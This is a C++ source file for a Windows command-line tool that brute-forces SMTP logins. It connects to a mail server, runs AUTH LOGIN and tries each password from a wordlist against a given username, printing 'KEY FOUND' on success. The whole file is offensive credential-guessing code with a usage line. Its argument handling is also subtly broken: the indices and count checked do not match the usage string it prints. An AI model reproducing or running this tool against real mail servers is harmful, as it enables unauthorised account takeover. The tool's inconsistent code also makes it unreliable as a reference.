#include <iostream>
#include <fstream>
#include <string>
#include <winsock2.h>
#include <windows.h>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

// Function to initialize Winsock
bool initWinsock() {
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    return iResult == 0;
}

// Function to clean up Winsock
void cleanupWinsock() {
    WSACleanup();
}

// Function to connect to the SMTP server
SOCKET connectToServer(const std::string& server, int port) {
    sockaddr_in serverAddr;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed!" << std::endl;
        return INVALID_SOCKET;
    }

    hostent* host = gethostbyname(server.c_str());
    if (host == nullptr) {
        std::cerr << "Host lookup failed!" << std::endl;
        return INVALID_SOCKET;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr = *((in_addr*)host->h_addr);

    if (connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed!" << std::endl;
        return INVALID_SOCKET;
    }
    return sock;
}

// Function to send and receive data from server
std::string sendCommand(SOCKET sock, const std::string& command) {
    send(sock, command.c_str(), command.length(), 0);
    char buffer[1024];
    int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
    if (bytesReceived == SOCKET_ERROR) {
        return "";
    }
    buffer[bytesReceived] = '\0';
    return std::string(buffer);
}

// Function to base64 encode a string
std::string base64_encode(const std::string& in) {
    static const char* encoding_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    int val = 0, valb = -6;
    for (unsigned char c : in) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            out.push_back(encoding_table[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) out.push_back(encoding_table[((val << 8) >> (valb + 8)) & 0x3F]);
    while (out.size() % 4) out.push_back('=');
    return out;
}

// Function to attempt authentication (HELO, AUTH LOGIN, and password attempt)
bool bruteForceSMTP(const std::string& server, int port, const std::string& username, const std::string& password) {
    SOCKET sock = connectToServer(server, port);
    if (sock == INVALID_SOCKET) return false;

    // Receive server greeting
    std::string response = sendCommand(sock, "HELO example.com\r\n");
    if (response.find("250") == std::string::npos) {
        closesocket(sock);
        return false;
    }

    // Start AUTH LOGIN
    response = sendCommand(sock, "AUTH LOGIN\r\n");
    if (response.find("334") == std::string::npos) {
        closesocket(sock);
        return false;
    }

    // Send username (base64 encoded)
    std::string encodedUsername = base64_encode(username);
    response = sendCommand(sock, encodedUsername + "\r\n");
    if (response.find("334") == std::string::npos) {
        closesocket(sock);
        return false;
    }

    // Send password (base64 encoded)
    std::string encodedPassword = base64_encode(password);
    response = sendCommand(sock, encodedPassword + "\r\n");
    if (response.find("235") != std::string::npos) { // Successful authentication
        std::cout << "KEY FOUND: " << password << std::endl;
        closesocket(sock);
        return true;
    }

    closesocket(sock);
    return false;
}

int main(int argc, char* argv[]) {
    if (argc != 6) {
        std::cerr << "Usage: brute.exe -l <username> -P <path_to_wordlist> smtp.<domain> <port>" << std::endl;
        return 1;
    }

    std::string username = argv[2];
    std::string wordlistPath = argv[4];
    std::string server = argv[3];
    int port = std::stoi(argv[5]);

    if (!initWinsock()) {
        std::cerr << "Winsock initialization failed!" << std::endl;
        return 1;
    }

    std::ifstream wordlist(wordlistPath);
    if (!wordlist.is_open()) {
        std::cerr << "Could not open wordlist!" << std::endl;
        cleanupWinsock();
        return 1;
    }

    std::string password;
    bool keyFound = false;
    while (getline(wordlist, password)) {
        if (bruteForceSMTP(server, port, username, password)) {
            keyFound = true;
            break;
        }
    }

    if (!keyFound) {
        std::cout << "KEY NOT FOUND" << std::endl;
    }

    cleanupWinsock();
    return 0;
}
